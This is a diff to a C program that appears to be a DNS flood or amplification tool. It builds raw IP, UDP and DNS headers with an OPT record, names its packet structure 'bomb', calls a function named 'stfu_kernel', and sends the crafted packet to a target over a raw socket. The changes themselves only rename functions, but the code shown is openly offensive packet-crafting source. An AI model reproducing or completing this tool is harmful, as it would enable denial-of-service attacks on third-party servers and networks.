@@ -77,9 +77,9 @@ unsigned short Checksum(unsigned short *, int);
 Trash *Build_IP_Header(Trash *);
 Trash *Build_UDP_Header(Trash *);
 Trash *DNS_Request(Trash *);
-void dns_name_format(char *, char *);
-Trash *build_packet(Trash *,  int);
-Trash *Fill_sock(Trash *);
+void DNS_Format(char *, char *);
+Trash *Build_Packet(Trash *,  int);
+Trash *Fillin_sock(Trash *);
 void Implement(int);
 
 
@@ -160,8 +160,8 @@ Trash *Build_UDP_Header(Trash *bomb)
 }
 
 
-/* convert to dns format */
-void dns_name_format(char *qname, char *host)
+/* Convert to DNS format */
+void DNS_Format(char *qname, char *host)
 {
     int i = 0;
     int j = 0;
@@ -207,7 +207,7 @@ Trash *DNS_Request(Trash *bomb)
     qname = &bomb->packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 
         sizeof(DNS_header)];
     /*job->domain = "www.google.com.";*/
-    dns_name_format(qname, DEFAULT_DOMAIN);
+    DNS_Format(qname, DEFAULT_DOMAIN);
 
     bomb->query = (DNS_query *) &bomb->packet[sizeof(struct iphdr) + 
         sizeof(struct udphdr) + sizeof(DNS_header) + (strlen(qname) + 1)];
@@ -226,7 +226,7 @@ Trash *DNS_Request(Trash *bomb)
     return bomb;
 }
 
-Trash *build_packet(Trash *a, int c)
+Trash *Build_Packet(Trash *a, int c)
 {   
     a->packet = (char *) malloc(4096);
     a->packet = memset(a->packet, 0x00, 4096);
@@ -238,7 +238,7 @@ Trash *build_packet(Trash *a, int c)
     return a;
 }
 
-Trash *Fill_sock(Trash *a)
+Trash *Fillin_sock(Trash *a)
 {
     a->target.sin_family = AF_INET;
     a->target.sin_port = a->udp->dest;
@@ -250,15 +250,14 @@ Trash *Fill_sock(Trash *a)
 void Implement(int a)
 {
     Trash *b = NULL;
-
     
     b = (Trash *) malloc(sizeof(Trash));
     b = memset(b, 0, sizeof(Trash)); /*0x00*/
 
     b = Create_Rawsock(b);
     b = stfu_kernel(b);
-    b = build_packet(b, a);
-    b = Fill_sock(b);
+    b = Build_Packet(b, a);
+    b = Fillin_sock(b);
 
     sendto(b->sock, b->packet, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS_header)
                              + sizeof(DNS_query) + sizeof(DNS_opt)+ strlen(DEFAULT_DOMAIN) + 1, 0, (struct sockaddr *) &b->target, sizeof(b->target));
